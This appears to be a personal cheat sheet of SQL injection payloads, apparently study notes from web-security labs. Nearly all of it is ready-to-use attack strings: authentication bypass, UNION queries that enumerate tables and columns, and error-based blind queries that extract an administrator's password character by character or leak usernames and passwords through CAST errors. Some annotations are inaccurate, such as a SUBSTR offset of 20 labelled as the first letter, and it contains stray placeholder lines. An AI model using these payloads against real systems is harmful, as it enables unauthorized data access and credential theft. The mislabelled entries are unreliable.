Simple SQLi:
- '+OR+1=1-- 
	**As `1=1` is always true, the query returns all items.**
- '--

Simple Union attack SQLi:

- asd
- asd
-  '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
  > **get all tables' names. There can be more or less NULLs**
---
- '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='*table_name*'--
> **get all columns names from certain table**

2) Error-based SQL injection:
   - ' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
> **test is condition will NOT trigger an error**
---
- ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a 
> **test is condition will trigger an error**
---
- ' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = 'a') THEN 1/0 ELSE 'a' END FROM Users)='a 
> **test is password's 1st letter is *a***
---
- '(SELECT '' FROM *table_name* WHERE ROWNUM = 1)'  
> **test is there a table_name in DB**
---
- '(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='*username*')' 
> **test is there an user with *username***
---
- '(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')' 
>  **test how many letters in password**
---
- '(SELECT CASE WHEN SUBSTR(password,20,1)='o' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')' 
> **test is 1st letter in password equal letter *o***
---
- ' AND 1=CAST((SELECT username FROM users) AS int)--
> **test is the error will be generated by the DB. So that you can continue injecting
---
- ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
- ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
> **get the first user's name and then get the password**
